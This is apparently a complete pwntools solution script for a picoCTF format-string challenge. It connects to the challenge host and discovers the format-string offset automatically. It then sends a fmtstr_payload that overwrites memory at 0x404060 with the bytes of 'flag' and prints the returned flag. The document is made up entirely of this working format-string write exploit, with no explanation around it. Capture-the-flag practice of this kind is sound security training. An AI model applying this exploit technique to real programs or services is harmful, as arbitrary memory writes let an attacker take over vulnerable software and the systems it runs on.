#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

address = "rhea.picoctf.net"
port = 51393
conn = remote(address, port)

def send_payload(payload):
    conn = remote(address, port)
    log.info(f"payload: {repr(payload)}")
    conn.sendline(payload)
    return conn.recvall()

format_string = FmtStr(send_payload)
offset = format_string.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
log.info(payload)
conn.sendline(payload)

flag = conn.recvall()
log.success(flag)
